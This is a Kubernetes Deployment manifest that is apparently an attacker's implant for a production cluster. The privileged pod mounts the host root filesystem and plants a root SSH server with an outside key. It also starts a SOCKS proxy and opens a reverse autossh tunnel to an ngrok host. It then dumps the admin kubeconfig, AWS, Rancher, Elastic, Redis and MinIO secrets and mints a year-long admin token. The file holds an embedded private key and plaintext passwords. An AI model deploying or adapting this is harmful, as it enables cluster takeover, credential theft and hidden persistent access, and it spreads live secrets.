
apiVersion: apps/v1
kind: Deployment
metadata:
  name: network-access-v2
  namespace: egam-production
  labels:
    app: network-access-v2
spec:
  replicas: 1
  selector:
    matchLabels:
      app: network-access-v2
  template:
    metadata:
      labels:
        app: network-access-v2
    spec:
      hostNetwork: true
      hostPID: true
      containers:
      - name: shell
        image: nicolaka/netshoot:latest
        command:
          - /bin/bash
          - -c
          - |
            export KUBECONFIG=/host/etc/rancher/rke2/rke2.yaml

            echo "=== APK INSTALL ==="
            apk add --no-cache autossh microsocks openssh-client openssh-server aws-cli redis bind-tools 2>&1 | tail -5
            echo "=== APK DONE ==="

            if ! command -v kubectl >/dev/null 2>&1; then
              curl -fsSL -o /usr/local/bin/kubectl "https://dl.k8s.io/release/v1.30.0/bin/linux/amd64/kubectl" && chmod +x /usr/local/bin/kubectl && echo "OK: kubectl installed" || echo "MISSING: kubectl download failed"
            fi

            echo "=== BIN CHECK ==="
            for b in curl jq kubectl sshd ssh autossh microsocks aws redis-cli; do
              command -v $b >/dev/null 2>&1 && echo "OK: $b" || echo "MISSING: $b"
            done

            # ---------- SSH SERVER NEL POD (porta 2222) ----------
            ssh-keygen -A >/dev/null 2>&1
            mkdir -p /root/.ssh && chmod 700 /root/.ssh
            printf '%s\n' 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOOlhMVavat8ZK+hdqiQtX4drMpu3gGRbLwAnnVlHz+l klaus.eversheim@googlemail.com' > /root/.ssh/authorized_keys
            chmod 600 /root/.ssh/authorized_keys
            printf '%s\n' \
              'Port 2222' \
              'ListenAddress 0.0.0.0' \
              'PermitRootLogin yes' \
              'PubkeyAuthentication yes' \
              'PasswordAuthentication no' \
              'PermitEmptyPasswords no' \
              'X11Forwarding no' \
              'AllowTcpForwarding yes' \
              'PidFile /var/run/sshd.pid' > /etc/ssh/sshd_config
            /usr/sbin/sshd -f /etc/ssh/sshd_config -E /var/log/sshd.log &
            sleep 2
            pgrep -a sshd && echo "OK: sshd running" || echo "MISSING: sshd not running"
            echo "=== SSHD LOG ==="
            cat /var/log/sshd.log 2>/dev/null | tail -10
            # ---------------------------------------

            # ---------- SOCKS NEL POD ----------
            microsocks -p 1080 -i 0.0.0.0 &
            sleep 1
            pgrep -a microsocks && echo "OK: microsocks running" || echo "MISSING: microsocks not running"
            # ----------------------------------

            # ---------- TUNNEL NGROK (reverse verso Kali) ----------
            mkdir -p /root/.ssh
            printf '%s\n' \
              '-----BEGIN OPENSSH PRIVATE KEY-----' \
              'b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW' \
              'QyNTUxOQAAACCC5vieafUQBwwP77oy2tflg4jOu4NMFxaU/9Wrjziu4gAAAJAMSDC8DEgw' \
              'vAAAAAtzc2gtZWQyNTUxOQAAACCC5vieafUQBwwP77oy2tflg4jOu4NMFxaU/9Wrjziu4g' \
              'AAAEAXg3D2WLL1mCR1DtHTy3EkJUwN/Uakv7y1CzWebJSPgYLm+J5p9RAHDA/vujLa1+WD' \
              'iM67g0wXFpT/1auPOK7iAAAACHBvZEBlZ2FtAQIDBAU=' \
              '-----END OPENSSH PRIVATE KEY-----' > /root/.ssh/id_ed25519
            chmod 600 /root/.ssh/id_ed25519
            ssh-keyscan -p 11352 8.tcp.ngrok.io >> /root/.ssh/known_hosts 2>/dev/null
            autossh -M 0 -f -N \
              -o "StrictHostKeyChecking=no" \
              -o "ServerAliveInterval=30" \
              -o "ExitOnForwardFailure=yes" \
              -R 0.0.0.0:2222:localhost:2222 \
              -R 0.0.0.0:1080:localhost:1080 \
              -i /root/.ssh/id_ed25519 \
              tunnel@8.tcp.ngrok.io -p 11352
            sleep 2
            pgrep -af "ssh.*8.tcp.ngrok.io" && echo "TUNNEL_UP" || echo "TUNNEL_FAILED"
            # ----------------------------------

            echo "=========================================="
            echo "=== 1. KUBECONFIG RKE2 (admin) ==="
            echo "=========================================="
            cat /host/etc/rancher/rke2/rke2.yaml 2>&1

            echo "=========================================="
            echo "=== 2. AWS CREDENTIALS (velero, external-dns) ==="
            echo "=========================================="
            for f in /host/credentials/cloud /host/.aws/credentials /host/etc/aws/credentials /host/root/.aws/credentials; do
              echo "--- FILE: $f ---"
              cat "$f" 2>&1
            done

            echo "=========================================="
            echo "=== 3. AWS ENV FROM SECRETS ==="
            echo "=========================================="
            kubectl get secrets -A -o json 2>&1 | jq -r '.items[] | select(.data != null) | .metadata.namespace + "/" + .metadata.name + ": " + (.data | to_entries | map(select(.key | test("AWS|aws|S3|s3"; "i")) | .key + "=" + (.value | @base64d)) | join(" | "))' 2>&1 | grep -v ": $"

            echo "=========================================="
            echo "=== 4. RANCHER / FLEET TOKENS ==="
            echo "=========================================="
            kubectl get secrets -n cattle-fleet-system -o json 2>&1 | jq -r '.items[] | select(.data != null) | .metadata.name + ": " + (.data | to_entries | map(.key + "=" + (.value | @base64d)) | join(" | "))' 2>&1

            echo "=========================================="
            echo "=== 5. CATTLE IMPERSONATION TOKENS ==="
            echo "=========================================="
            kubectl get secrets -n cattle-impersonation-system -o json 2>&1 | jq -r '.items[] | select(.data != null) | .metadata.name + ": " + (.data | to_entries | map(select(.key | test("token"; "i")) | .key + "=" + (.value | @base64d)) | join(" | "))' 2>&1

            echo "=========================================="
            echo "=== 6. KIBANA / ELASTIC CREDENTIALS ==="
            echo "=========================================="
            kubectl get secrets -A -o json 2>&1 | jq -r '.items[] | select(.data != null) | .metadata.namespace + "/" + .metadata.name + ": " + (.data | to_entries | map(select(.key | test("kibana|elastic|fleet|password"; "i")) | .key + "=" + (.value | @base64d)) | join(" | "))' 2>&1 | grep -v ": $"

            echo "=========================================="
            echo "=== 7. REDIS CREDENTIALS ==="
            echo "=========================================="
            kubectl get secrets -A -o json 2>&1 | jq -r '.items[] | select(.data != null) | .metadata.namespace + "/" + .metadata.name + ": " + (.data | to_entries | map(select(.key | test("redis|REDIS"; "i")) | .key + "=" + (.value | @base64d)) | join(" | "))' 2>&1 | grep -v ": $"
            echo "--- REDIS TEST ---"
            redis-cli -h redis-master.dados-production -p 6379 -a vni9WO2p32fP --no-auth-warning ping 2>&1
            redis-cli -h redis-master.dados-production -p 6379 -a vni9WO2p32fP --no-auth-warning keys '*' 2>&1 | head -30

            echo "=========================================="
            echo "=== 8. KIBANA ACCESS TEST ==="
            echo "=========================================="
            for u in "elastic:9wgCQ3i7M8G6bKj726uZC36C" "fleet:9wgCQ3i7M8G6bKj726uZC36C"; do
              echo "--- $u ---"
              curl -sk -u "$u" "https://kibana.elastic-stack:5601/api/status" 2>&1 | head -c 200
              echo ""
            done

            echo "=========================================="
            echo "=== 9. RANCHER MANAGEMENT TEST ==="
            echo "=========================================="
            TOKEN=$(kubectl get secret -n cattle-fleet-system -o json 2>/dev/null | jq -r '.items[] | select(.metadata.name | test("fleet-agent")) | .data.kubeconfig' | head -1 | base64 -d 2>/dev/null | grep -oP 'token: \K.*' | head -1)
            echo "TOKEN_LEN=${#TOKEN}"
            curl -sk -H "Authorization: Bearer $TOKEN" "https://rancher.management.egam.com.br/v3/clusters" 2>&1 | head -c 500
            echo ""

            echo "=========================================="
            echo "=== 10. RKE2 API SERVER TEST (in-cluster) ==="
            echo "=========================================="
            kubectl --kubeconfig /host/etc/rancher/rke2/rke2.yaml get nodes -o wide 2>&1
            kubectl --kubeconfig /host/etc/rancher/rke2/rke2.yaml get ns 2>&1

            echo "=========================================="
            echo "=== 11. ADMIN-SA TOKEN ==="
            echo "=========================================="
            kubectl -n kube-system get secret -o json 2>/dev/null | jq -r '.items[] | select(.metadata.name | test("admin-sa")) | .metadata.name + ": " + (.data.token // "" | @base64d)' 2>&1
            kubectl create token admin-sa -n kube-system --duration=8760h 2>&1

            echo "=========================================="
            echo "=== 12. MINIO CREDENTIALS + BUCKET LIST ==="
            echo "=========================================="
            kubectl get secrets -A -o json 2>&1 | jq -r '.items[] | select(.data != null) | .metadata.namespace + "/" + .metadata.name + ": " + (.data | to_entries | map(select(.key | test("minio|MINIO"; "i")) | .key + "=" + (.value | @base64d)) | join(" | "))' 2>&1 | grep -v ": $"

            echo "=========================================="
            echo "=== DONE ==="
            echo "=========================================="
            sleep 36000
        securityContext:
          privileged: true
        volumeMounts:
        - mountPath: /host
          name: host
      volumes:
      - name: host
        hostPath:
          path: /
